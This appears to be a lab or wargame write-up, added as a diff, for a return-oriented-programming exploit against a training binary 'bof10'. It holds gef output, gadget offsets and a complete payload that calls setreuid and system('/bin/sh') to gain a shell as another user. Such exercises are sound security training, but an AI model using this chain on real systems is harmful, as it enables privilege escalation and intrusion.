@@ -1,0 +1,58 @@
+####### BUF TO RETURN ADDRESS
+gef➤  p/d 0x7fffffffe448 - 0x00007fffffffe438
+$2 = 16
+
+####### FINE POP RDI ; RET GADGET
+$ ROPgadget.py --binary /tmp/2.23/lib/libc.so.6 | grep "pop rdi ; ret"
+0x0000000000021102 : pop rdi ; ret
+gef➤  vmmap
+[ Legend:  Code | Heap | Stack ]
+Start              End                Offset             Perm Path
+0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /tmp/2.23/lib/libc.so.6
+gef➤  p/x 0x00007ffff7a0d000 + 0x0000000000021102
+$1 = 0x7ffff7a2e102
+
+####### FINE POP RSI ; RET GADGET
+$ ROPgadget.py --binary /tmp/2.23/lib/libc.so.6 | grep "pop rsi ; ret"
+0x00000000000202e8 : pop rsi ; ret
+gef➤  p/x 0x00007ffff7a0d000 + 0x00000000000202e8
+$2 = 0x7ffff7a2d2e8
+
+####### FIND NECESSARY ADDRESSES
+gef➤  p setreuid
+$3 = {<text variable, no debug info>} 0x7ffff7b0a190 <setreuid>
+gef➤  p setregid
+$4 = {<text variable, no debug info>} 0x7ffff7b0a200 <setregid>
+gef➤  p system
+$5 = {<text variable, no debug info>} 0x7ffff7a52390 <system>
+gef➤  search-pattern /bin/sh
+[+] Searching '/bin/sh' in memory
+[+] In '/tmp/2.23/lib/libc.so.6'(0x7ffff7a0d000-0x7ffff7bcd000), permission=r-x
+  0x7ffff7b99d57 - 0x7ffff7b99d5e  →   "/bin/sh"
+
+####### MAKE PAYLOAD
+<buf to return dummy> 
++ <"pop rdi ; ret" gadget> + <8 byte little endian of bof11 UID(1011)>
++ <"pop rsi ; ret" gadget> + <8 byte little endian of bof11 UID(1011)>
++ <setreuid address>
++ <"pop rdi ; ret" gadget> + <8 byte little endian of bof11 UID(1011)>
++ <"pop rsi ; ret" gadget> + <8 byte little endian of bof11 UID(1011)>
++ <setgeuid address>
++ <"pop rdi ; ret" gadget> + <"/bin/sh" address>
++ <system address>
+
+$ (python -c "print 'a' * 16 
++ '\x02\xe1\xa2\xf7\xff\x7f\x00\x00' + '\xf3\x03\x00\x00\x00\x00\x00\x00' 
++ '\xe8\xd2\xa2\xf7\xff\x7f\x00\x00' + '\xf3\x03\x00\x00\x00\x00\x00\x00' 
++ '\x90\xa1\xb0\xf7\xff\x7f\x00\x00'
++ '\x02\xe1\xa2\xf7\xff\x7f\x00\x00' + '\xf3\x03\x00\x00\x00\x00\x00\x00' 
++ '\xe8\xd2\xa2\xf7\xff\x7f\x00\x00' + '\xf3\x03\x00\x00\x00\x00\x00\x00' 
++ '\x00\xa2\xb0\xf7\xff\x7f\x00\x00'
++ '\x02\xe1\xa2\xf7\xff\x7f\x00\x00' + '\x57\x9d\xb9\xf7\xff\x7f\x00\x00' 
++ '\x90\x23\xa5\xf7\xff\x7f\x00\x00'
+";cat) | ./bof10
+
+$ (python -c "print 'a' * 16 + '\x02\xe1\xa2\xf7\xff\x7f\x00\x00' + '\xf3\x03\x00\x00\x00\x00\x00\x00' + '\xe8\xd2\xa2\xf7\xff\x7f\x00\x00' + '\xf3\x03\x00\x00\x00\x00\x00\x00' + '\x90\xa1\xb0\xf7\xff\x7f\x00\x00' + '\x02\xe1\xa2\xf7\xff\x7f\x00\x00' + '\xf3\x03\x00\x00\x00\x00\x00\x00' + '\xe8\xd2\xa2\xf7\xff\x7f\x00\x00' + '\xf3\x03\x00\x00\x00\x00\x00\x00' + '\x00\xa2\xb0\xf7\xff\x7f\x00\x00' + '\x02\xe1\xa2\xf7\xff\x7f\x00\x00' + '\x57\x9d\xb9\xf7\xff\x7f\x00\x00' + '\x90\x23\xa5\xf7\xff\x7f\x00\x00' ";cat) | ./bof10 
+
+####### MAKE POC
+-> exp_bof10.py
